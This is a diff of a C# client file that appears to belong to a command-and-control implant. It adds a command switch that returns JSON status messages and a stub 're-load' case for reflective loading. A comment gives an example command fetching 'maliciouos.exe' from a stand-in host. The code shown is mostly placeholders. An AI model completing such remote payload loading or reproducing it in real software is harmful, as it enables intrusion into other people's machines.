@@ -1,12 +1,23 @@
 ﻿//import ALL the tools... yay
 
 
+/*
+ * Ryan Documentation note:
+ * Each case value will take the parsed command, run it, and based on the output, pack a json string. that json string gets returned, 
+ * then send back to the server
+ * 
+ * 
+ * 
+ */
+
 namespace Client.Logic
 {
 
     class Trees
     {
-        static void decisionTree(command)
+        //interal, would rather not have anyone poking around at this lol
+        //DocuNotes: Takes the MyJsonStruct type, which is just the data type defined in Comms.JsonHandler.
+        internal static string decisionTree(JsonStruct.MyJsonStruct command)
         {
             //need to:
             /*
@@ -25,19 +36,36 @@ namespace Client.Logic
              *      command arg: http://safe.com/maliciouos.exe -recon
              * 
             */
+            //fill this in with placeholder JSON just in case the switch fails
+            string jsonString = "";
+
+            string parsedCommand = command.msg.msg_command;
 
 
-            switch (command)
+            switch (parsedCommand)
             {
                 case "":
                 case "wait":
                 case "sleep":
-                    //return ?
-                    break;
+                    jsonString = Client.Comms.JsonHandler.ToJson(
+                        CID: Client.PropertyHandler.Properties.ID,
+                        msgValue: $"{parsedCommand} recieved, Client sleeping");
+
+                    return jsonString;
+
+                case "re-load":
+                    //parse arguments (see above)...
+                    //run reflective load...
+                    //get results from refelctive load...
+                    //pack into json & return
+
 
                 default:
-                    //return ?
-                    break;
+                    jsonString = Client.Comms.JsonHandler.ToJson(
+                        CID: Client.PropertyHandler.Properties.ID,
+                        msgValue: "No command recieved, Client sleeping");
+
+                    return jsonString;
             } 
 
 
